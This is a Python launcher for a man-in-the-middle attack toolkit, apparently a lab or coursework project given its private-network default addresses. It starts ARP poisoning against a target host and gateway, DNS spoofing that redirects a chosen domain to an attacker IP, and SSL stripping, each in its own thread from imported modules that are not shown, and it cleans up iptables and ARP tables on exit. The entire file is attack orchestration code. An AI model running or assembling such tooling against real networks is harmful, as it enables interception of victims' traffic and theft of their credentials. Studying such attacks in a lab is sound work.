import argparse
import threading

from rules import flush_rules

def parse_args():
    p = argparse.ArgumentParser(description="Launch Script", add_help=False)
    p.add_argument("--mode", required=True, choices=["arp", "arp+dns", "arp+ssl", "arp+dns+ssl"], help="Select which components to run")

    # Parse only --mode first
    args, remaining = p.parse_known_args()

    parser = argparse.ArgumentParser(description="Launch Script")
    parser.add_argument("--mode", required=True, choices=["arp", "arp+dns", "arp+ssl", "arp+dns+ssl"], help="Select which components to run")

    # ARP Poisoning arguments
    if "arp" in args.mode:
        parser.add_argument("--target-ip", default="192.168.2.12", help="Target host IP")
        parser.add_argument("--gateway-ip", default="192.168.2.254", help="Gateway/router IP")
        parser.add_argument("--interval", type=float, default=0.1, help="Loop delay in seconds")

    # DNS Spoofing arguments
    if "dns" in args.mode:
        parser.add_argument("--target-url", default="bing.com", help="Target host URL to spoof")
        parser.add_argument("--attacker-ip", default="192.168.2.254", help="IP address to redirect the target to")
        parser.add_argument("--queue-num", type=int, default=0, help="Netfilter Queue number")

    # SSL Stripping has no arguments

    return parser.parse_args()

def main():
    args = parse_args()

    mode = args.mode

    try:
        arp_poison_thread = None
        dns_spoof_thread = None
        ssl_stripping_thread = None

        if "arp" in mode:
            from arp_poison import main as arp_poisoning_main
            print("[*] Starting ARP Poisoning...")
            arp_poison_thread = threading.Thread(name="arp_poisoning", target=arp_poisoning_main, args=(args.target_ip, args.gateway_ip, args.interval), daemon=True)
            arp_poison_thread.start()
        
        if "dns" in mode:
            from dns_spoof import main as dns_spoofing_main
            print("[*] Starting DNS Spoofing...")
            dns_spoof_thread = threading.Thread(name="dns_spoofing", target=dns_spoofing_main, args=(args.target_url, args.attacker_ip, args.queue_num), daemon=True)
            dns_spoof_thread.start()

        if "ssl" in mode:
            from ssl_strip import main as ssl_stripping_main
            print("[*] Starting SSL Stripping...")
            ssl_stripping_thread = threading.Thread(name="ssl_stripping", target=ssl_stripping_main, daemon=True)
            ssl_stripping_thread.start()

        # Just keep the main thread blocked and alive while child threads are running, until KeyboardInterrupt
        if arp_poison_thread:
            arp_poison_thread.join()
        if dns_spoof_thread:
            dns_spoof_thread.join()
        if ssl_stripping_thread:
            ssl_stripping_thread.join()

    except KeyboardInterrupt:
        print("\n[!] CTRL+C detected. Cleaning up...")

        # Flush the iptables rules
        flush_rules()

        # Restore ARP tables
        if "arp" in mode:
            from arp_poison import restore as arp_poison_restore
            arp_poison_restore(args.target_ip, args.gateway_ip)
            arp_poison_restore(args.gateway_ip, args.target_ip)
            print("[+] ARP tables restored.")
        
        print("[+] Cleanup completed. Exiting.")

if __name__ == "__main__":
    main()